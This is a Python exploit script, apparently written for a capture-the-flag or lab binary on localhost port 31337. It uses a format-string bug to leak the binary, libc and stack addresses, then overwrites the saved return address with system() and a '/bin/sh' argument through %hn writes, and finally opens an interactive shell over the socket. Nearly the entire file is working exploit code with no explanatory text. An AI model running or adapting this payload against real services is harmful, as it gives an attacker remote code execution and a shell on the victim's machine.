from struct import pack, unpack
from telnetlib import Telnet
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
target = ("localhost", 31337)
p32 = lambda x : pack("<I",x)
u32 = lambda x : unpack("<I",x)[0]

bin_offset = 0x637
stack_offset = 0x4
arg_offset = 0x8
putsgot_offset = 0x1fd8
fflushgot_offset = 0x1fd0
fgetsgot_offset = 0x1fd4
memsetgot_offset = 0x1fe0
printfgot_offset = 0x1fcc
printflibc_offset = 0x512d0
systemlibc_offset = 0x3d200
binsh_offset = 0x17e0cf

s.connect(target)
s.recv(1024)
s.send("%3$x" + '\n')
bin_leak = int(s.recv(1024)[:-1], 16)

print("[*] Leaked address: " + hex(bin_leak))
bin_base = bin_leak - bin_offset
print("[*] Binary base address: " + hex(bin_base))

putsgot_addr = bin_base + putsgot_offset
print("[*] puts@got address: " + hex(putsgot_addr))

fflushgot_addr = bin_base + fflushgot_offset
print("[*] fflush@got address: " + hex(fflushgot_addr))

fgetsgot_addr = bin_base + fgetsgot_offset
print("[*] fgets@got address: " + hex(fgetsgot_addr))

memsetgot_addr = bin_base + memsetgot_offset
print("[*] memset@got address: " + hex(memsetgot_addr))

printfgot_addr = bin_base + printfgot_offset
print("[*] printf@got address: " + hex(printfgot_addr))

payload = p32(putsgot_addr)
payload += b"%7$s"
s.send(payload + '\n')
puts = s.recv(1024)
puts = u32(puts[4:8])
print("[*] puts@libc address: " + hex(puts))

payload = p32(fflushgot_addr)
payload += b"%7$s"
s.send(payload + '\n')
fflush = s.recv(1024)
fflush = u32(fflush[4:8])
print("[*] fflush@libc address: " + hex(fflush))

payload = p32(fgetsgot_addr)
payload += b"%7$s"
s.send(payload + '\n')
fgets = s.recv(1024)
fgets = u32(fgets[4:8])
print("[*] fgets@libc address: " + hex(fgets))
"""
payload = p32(memsetgot_addr)
payload += b"%7$s"
s.send(payload + '\n')
memset = s.recv(1024)
memset = u32(memset[4:8])
print("[*] memset@libc address: " + hex(memset))
"""
payload = p32(printfgot_addr)
payload += b"%7$s"
s.send(payload + '\n')
printf = s.recv(1024)
printf = u32(printf[4:8])
print("[*] printf@libc address: " + hex(printf))

libc_base = printf - printflibc_offset
print("[*] libc base address: " + hex(libc_base))

system = libc_base + systemlibc_offset
print("[*] system address: " + hex(system))

binsh = libc_base + binsh_offset
print("[*] binsh address: " + hex(binsh))

s.send("%72$x" + '\n')
stack_leak = int(s.recv(1024)[:-1], 16)

print("[*] Leaked stack address: " + hex(stack_leak))
eip_addr = stack_leak - stack_offset
print("[*] EIP address: " + hex(eip_addr))
arg_addr = eip_addr + arg_offset
print("[*] Argument address: " + hex(arg_addr))

def address_write(system):
    firsthalfhex = hex(system)[6:]
    firsthalf = int("0x" + firsthalfhex, 0)
    firsthalf -= 12
    secondhalfhex = hex(system)[:6]
    firsthalfhex = int("0x" + firsthalfhex, 16)
    secondhalf = int(secondhalfhex, 16) - firsthalfhex
    if len(str(secondhalf)) == 4:
        secondhalf = "0" + str(secondhalf)
    return (firsthalf, secondhalf)

firsthalf, secondhalf = address_write(system)
payload = p32(binsh)
payload += p32(eip_addr)
payload += p32(eip_addr + 2)
payload += b"%" + str.encode(str(firsthalf)) + b"x%8$hn"
payload += b"%" + str.encode(str(secondhalf)) + b"x%9$hn"
#payload = payload #.ljust(256)
print(payload)
s.send(payload + '\n')

firsthalf, secondhalf = address_write(binsh)
payload = p32(binsh)
payload += p32(arg_addr)
payload += p32(arg_addr + 2)
payload += b"%" + str.encode(str(firsthalf)) + b"x%8$hn"
payload += b"%" + str.encode(str(secondhalf)) + b"x%9$hn"
payload = payload.ljust(256)
print(payload)
s.send(payload + '\n')

t=Telnet()
t.sock=s
t.write(b'\nuname -a\nid\n')
t.interact()